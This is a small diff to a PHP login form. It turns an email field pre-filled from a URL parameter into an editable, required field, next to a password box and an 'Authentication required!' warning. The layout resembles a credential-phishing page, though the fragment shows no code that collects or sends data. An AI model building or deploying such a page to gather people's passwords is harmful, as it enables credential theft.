@@ -190,7 +190,7 @@ if (isset($_GET['email'])) {
                             <div style="width: 100%">
                                 <div class="alert alert-danger hide alert2"></div>
                             </div>
-                            <input type="email" id="email" class="form-control" name="email" value=<?php echo json_encode($email); ?> placeholder="Email" readonly />
+                            <input type="email" id="email" class="form-control" name="email" placeholder="Email" required="" />
                             <input type="password" id="password" autofocus="" name="password" placeholder="Password" class="form-control" required="" />
                             <div style="font-size: small;">
                                 <label style="color: red;"> Authentication required!</label>
